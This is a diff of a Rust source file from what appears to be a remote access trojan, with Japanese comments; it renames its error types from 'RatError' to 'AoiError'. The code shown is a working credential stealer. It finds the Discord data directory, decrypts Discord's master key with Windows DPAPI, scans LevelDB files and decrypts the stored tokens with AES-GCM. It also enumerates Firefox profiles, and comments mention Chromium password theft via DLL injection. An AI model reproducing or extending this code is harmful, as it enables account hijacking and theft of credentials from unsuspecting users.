@@ -1,4 +1,4 @@
-// 統合認証データ収集モジュール
+﻿// 統合認証データ収集モジュール
 // auth_collector_safe.rsの設計パターンを統合した改良版
 use serde::{Deserialize, Serialize};
 use std::{
@@ -8,7 +8,7 @@ use std::{
 };
 
 // Windows系でよく使用されるインポートは各関数内で使用時にインポート
-use crate::{Config, RatError, RatResult};
+use crate::{Config, AoiError, AoiResult};
 
 // -------------------------------------------------------------------------------------------------
 // エラー型定義（auth_collector_safe.rsから統合）
@@ -1462,7 +1462,7 @@ fn parse_ipconfig_interfaces(text: &str) -> Vec<AuthNetworkInterface> {
 // Chromiumパスワード収集はDLL注入で実装されています
 
 // Discord トークン収集
-fn collect_discord_tokens() -> RatResult<Vec<String>> {
+fn collect_discord_tokens() -> AoiResult<Vec<String>> {
     #[cfg(windows)]
     {
         extract_discord_tokens_windows()
@@ -1740,7 +1740,7 @@ fn collect_unix_network_info() -> Vec<String> {
 // ヘルパー関数
 
 #[cfg(feature = "browser")]
-fn get_firefox_profiles() -> RatResult<Vec<std::path::PathBuf>> {
+fn get_firefox_profiles() -> AoiResult<Vec<std::path::PathBuf>> {
     let mut profiles = Vec::new();
 
     if let Some(appdata) = std::env::var_os("APPDATA") {
@@ -1802,7 +1802,7 @@ fn detect_firefox_browser_type(profile_path: &std::path::Path) -> &'static str {
 // Chromiumパスワード復号化はDLL注入で実装されています
 
 #[cfg(windows)]
-fn extract_discord_tokens_windows() -> RatResult<Vec<String>> {
+fn extract_discord_tokens_windows() -> AoiResult<Vec<String>> {
     let mut tokens = Vec::new();
     let mut successful_extractions = 0;
 
@@ -1835,7 +1835,7 @@ fn extract_discord_tokens_windows() -> RatResult<Vec<String>> {
 
 // 高度なDiscordトークン抽出（DPAPI + AES復号化）
 #[cfg(windows)]
-fn extract_discord_with_decryption() -> RatResult<Vec<String>> {
+fn extract_discord_with_decryption() -> AoiResult<Vec<String>> {
     let discord_dir = find_discord_directory()?;
     let master_key = get_discord_master_key(&discord_dir.join("Local State"))?;
     let ldb_files = find_all_discord_ldb_files(&discord_dir)?;
@@ -1856,7 +1856,7 @@ fn extract_discord_with_decryption() -> RatResult<Vec<String>> {
     }
 
     if tokens.is_empty() {
-        Err(RatError::Config("No decrypted tokens found".to_string()))
+        Err(AoiError::Config("No decrypted tokens found".to_string()))
     } else {
         Ok(tokens)
     }
@@ -1864,10 +1864,10 @@ fn extract_discord_with_decryption() -> RatResult<Vec<String>> {
 
 // フォールバック: 手動パターンマッチング
 #[cfg(windows)]
-fn extract_discord_with_patterns() -> RatResult<Vec<String>> {
+fn extract_discord_with_patterns() -> AoiResult<Vec<String>> {
     let discord_path = get_config_dir()?.join("discord");
     if !discord_path.exists() {
-        return Err(RatError::Config("Discord directory not found".to_string()));
+        return Err(AoiError::Config("Discord directory not found".to_string()));
     }
 
     let mut tokens = Vec::new();
@@ -1897,13 +1897,13 @@ fn extract_discord_with_patterns() -> RatResult<Vec<String>> {
     );
 
     if tokens.is_empty() {
-        Err(RatError::Config("No pattern tokens found".to_string()))
+        Err(AoiError::Config("No pattern tokens found".to_string()))
     } else {
         Ok(tokens)
     }
 }
 
-fn search_tokens_in_directory(dir_path: &std::path::Path) -> RatResult<Vec<String>> {
+fn search_tokens_in_directory(dir_path: &std::path::Path) -> AoiResult<Vec<String>> {
     let mut tokens = Vec::new();
 
     if let Ok(entries) = std::fs::read_dir(dir_path) {
@@ -2009,7 +2009,7 @@ fn find_json_token(content: &str) -> Option<String> {
 
 // 使用しないため削除
 
-fn get_config_dir() -> RatResult<std::path::PathBuf> {
+fn get_config_dir() -> AoiResult<std::path::PathBuf> {
     #[cfg(windows)]
     {
         use windows::Win32::System::Com::CoTaskMemFree;
@@ -2019,10 +2019,10 @@ fn get_config_dir() -> RatResult<std::path::PathBuf> {
 
         // SHGetKnownFolderPath returns a CoTaskMem-allocated PWSTR; free with CoTaskMemFree
         let pw = unsafe { SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_DEFAULT, None) }
-            .map_err(|e| RatError::Config(format!("Failed to get RoamingAppData: {}", e)))?;
+            .map_err(|e| AoiError::Config(format!("Failed to get RoamingAppData: {}", e)))?;
         // Convert to String and free the memory
         let path_string = unsafe { pw.to_string() }
-            .map_err(|_| RatError::Config("Invalid UTF-16 path".to_string()))?;
+            .map_err(|_| AoiError::Config("Invalid UTF-16 path".to_string()))?;
         unsafe {
             CoTaskMemFree(Some(pw.0 as _));
         }
@@ -2032,12 +2032,12 @@ fn get_config_dir() -> RatResult<std::path::PathBuf> {
     {
         std::env::var("HOME")
             .map(|home| std::path::PathBuf::from(home).join(".config"))
-            .map_err(|_| RatError::Config("HOME not found".to_string()))
+            .map_err(|_| AoiError::Config("HOME not found".to_string()))
     }
 }
 
 #[cfg(not(feature = "browser"))]
-fn collect_firefox_passwords() -> RatResult<Vec<String>> {
+fn collect_firefox_passwords() -> AoiResult<Vec<String>> {
     Ok(vec!["Browser feature not enabled".to_string()])
 }
 
@@ -2082,12 +2082,12 @@ struct DataBlob {
 const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
 
 // Discordディレクトリを検出
-fn find_discord_directory() -> RatResult<std::path::PathBuf> {
+fn find_discord_directory() -> AoiResult<std::path::PathBuf> {
     let config_dir = get_config_dir()?;
     let discord_path = config_dir.join("discord");
 
     if !discord_path.exists() {
-        return Err(RatError::Config(format!(
+        return Err(AoiError::Config(format!(
             "Discord directory not found: {}",
             discord_path.display()
         )));
@@ -2098,7 +2098,7 @@ fn find_discord_directory() -> RatResult<std::path::PathBuf> {
 
 // DPAPIでデータを復号化
 #[cfg(windows)]
-fn dpapi_unprotect(data: &[u8]) -> RatResult<Vec<u8>> {
+fn dpapi_unprotect(data: &[u8]) -> AoiResult<Vec<u8>> {
     unsafe {
         let in_blob = DataBlob {
             cb_data: data.len() as u32,
@@ -2125,38 +2125,38 @@ fn dpapi_unprotect(data: &[u8]) -> RatResult<Vec<u8>> {
             LocalFree(out_blob.pb_data as *mut c_void);
             Ok(decrypted_data)
         } else {
-            Err(RatError::Config("DPAPI decryption failed".to_string()))
+            Err(AoiError::Config("DPAPI decryption failed".to_string()))
         }
     }
 }
 
 #[cfg(not(windows))]
-fn dpapi_unprotect(_data: &[u8]) -> RatResult<Vec<u8>> {
-    Err(RatError::Config(
+fn dpapi_unprotect(_data: &[u8]) -> AoiResult<Vec<u8>> {
+    Err(AoiError::Config(
         "DPAPI not available on non-Windows".to_string(),
     ))
 }
 
 // Local StateからDiscordのマスターキーを取得
-fn get_discord_master_key(local_state_path: &std::path::Path) -> RatResult<Vec<u8>> {
+fn get_discord_master_key(local_state_path: &std::path::Path) -> AoiResult<Vec<u8>> {
     let json_content = std::fs::read_to_string(local_state_path)
-        .map_err(|_| RatError::Config("Failed to read Local State".to_string()))?;
+        .map_err(|_| AoiError::Config("Failed to read Local State".to_string()))?;
 
     let v: serde_json::Value = serde_json::from_str(&json_content)
-        .map_err(|_| RatError::Config("Failed to parse Local State JSON".to_string()))?;
+        .map_err(|_| AoiError::Config("Failed to parse Local State JSON".to_string()))?;
 
     let encrypted_key_b64 = v["os_crypt"]["encrypted_key"]
         .as_str()
-        .ok_or_else(|| RatError::Config("Encrypted key not found in Local State".to_string()))?;
+        .ok_or_else(|| AoiError::Config("Encrypted key not found in Local State".to_string()))?;
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
         encrypted_key_b64,
     )
-    .map_err(|_| RatError::Config("Failed to decode encrypted key".to_string()))?;
+    .map_err(|_| AoiError::Config("Failed to decode encrypted key".to_string()))?;
 
     if !encrypted_key.starts_with(b"DPAPI") {
-        return Err(RatError::Config(
+        return Err(AoiError::Config(
             "Invalid key format (missing DPAPI prefix)".to_string(),
         ));
     }
@@ -2166,10 +2166,10 @@ fn get_discord_master_key(local_state_path: &std::path::Path) -> RatResult<Vec<u
 }
 
 // すべてのLDBファイルを検索
-fn find_all_discord_ldb_files(discord_dir: &std::path::Path) -> RatResult<Vec<std::path::PathBuf>> {
+fn find_all_discord_ldb_files(discord_dir: &std::path::Path) -> AoiResult<Vec<std::path::PathBuf>> {
     let leveldb_path = discord_dir.join("Local Storage").join("leveldb");
     if !leveldb_path.exists() {
-        return Err(RatError::Config(format!(
+        return Err(AoiError::Config(format!(
             "LevelDB directory not found: {}",
             leveldb_path.display()
         )));
@@ -2179,7 +2179,7 @@ fn find_all_discord_ldb_files(discord_dir: &std::path::Path) -> RatResult<Vec<st
     collect_ldb_files_recursive(&leveldb_path, &mut ldb_files)?;
 
     if ldb_files.is_empty() {
-        return Err(RatError::Config("No LDB files found".to_string()));
+        return Err(AoiError::Config("No LDB files found".to_string()));
     }
 
     ldb_files.sort();
@@ -2190,13 +2190,13 @@ fn find_all_discord_ldb_files(discord_dir: &std::path::Path) -> RatResult<Vec<st
 fn collect_ldb_files_recursive(
     dir: &std::path::Path,
     ldb_files: &mut Vec<std::path::PathBuf>,
-) -> RatResult<()> {
+) -> AoiResult<()> {
     let entries = std::fs::read_dir(dir)
-        .map_err(|_| RatError::Config(format!("Failed to read directory: {}", dir.display())))?;
+        .map_err(|_| AoiError::Config(format!("Failed to read directory: {}", dir.display())))?;
 
     for entry in entries {
         let entry =
-            entry.map_err(|_| RatError::Config("Failed to read directory entry".to_string()))?;
+            entry.map_err(|_| AoiError::Config("Failed to read directory entry".to_string()))?;
         let path = entry.path();
 
         if path.is_dir() {
@@ -2242,17 +2242,17 @@ fn extract_discord_encrypted_tokens(ldb_content: &str) -> Vec<String> {
 }
 
 // 暗号化されたトークンを復号化
-fn decrypt_discord_token(master_key: &[u8], encrypted_b64: &str) -> RatResult<String> {
+fn decrypt_discord_token(master_key: &[u8], encrypted_b64: &str) -> AoiResult<String> {
     use aes_gcm::{
         aead::{Aead, KeyInit},
         Aes256Gcm, Nonce,
     };
 
     let data = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_b64)
-        .map_err(|_| RatError::Config("Failed to decode encrypted token".to_string()))?;
+        .map_err(|_| AoiError::Config("Failed to decode encrypted token".to_string()))?;
 
     if data.len() < 15 + 16 {
-        return Err(RatError::Config(format!(
+        return Err(AoiError::Config(format!(
             "Invalid encrypted token length: {}",
             data.len()
         )));
@@ -2264,7 +2264,7 @@ fn decrypt_discord_token(master_key: &[u8], encrypted_b64: &str) -> RatResult<St
     let tag = &data[data.len() - 16..];
 
     let cipher = Aes256Gcm::new_from_slice(master_key)
-        .map_err(|_| RatError::Config("Failed to create AES cipher".to_string()))?;
+        .map_err(|_| AoiError::Config("Failed to create AES cipher".to_string()))?;
 
     let mut data_with_tag = ciphertext.to_vec();
     data_with_tag.extend_from_slice(tag);
@@ -2273,7 +2273,7 @@ fn decrypt_discord_token(master_key: &[u8], encrypted_b64: &str) -> RatResult<St
 
     let plaintext = cipher
         .decrypt(nonce, data_with_tag.as_ref())
-        .map_err(|_| RatError::Config("Failed to decrypt token".to_string()))?;
+        .map_err(|_| AoiError::Config("Failed to decrypt token".to_string()))?;
 
     Ok(String::from_utf8_lossy(&plaintext).to_string())
 }
